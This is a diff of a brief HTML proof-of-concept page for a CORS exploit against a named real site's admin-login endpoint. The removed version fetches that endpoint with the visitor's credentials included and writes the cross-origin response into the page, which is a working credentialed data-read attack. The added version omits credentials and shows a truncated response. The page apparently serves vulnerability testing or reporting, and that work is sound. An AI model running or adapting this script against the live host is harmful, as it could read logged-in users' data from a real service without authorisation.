@@ -1,18 +1,17 @@
+<!doctype html>
 <html>
 <body>
-  <h2>CORS Exploit PoC</h2>
+  <h3>CORS PoC — Read (no credentials)</h3>
+  <pre id="out">Running...</pre>
   <script>
     fetch("https://go.capital.com/v2/login/admin-login/", {
       method: "GET",
-      credentials: "include"
+      // **مهم**: لا تستخدم credentials here
+      credentials: "omit"
     })
-    .then(response => response.text())
-    .then(data => {
-      document.body.innerHTML += "<pre>" + data + "</pre>";
-    })
-    .catch(e => {
-      document.body.innerHTML += "<b>Exploit failed:</b> " + e;
-    });
+    .then(r => r.text())
+    .then(t => document.getElementById('out').textContent = t.slice(0,2000))
+    .catch(e => document.getElementById('out').textContent = 'Failed: ' + e);
   </script>
 </body>
 </html>
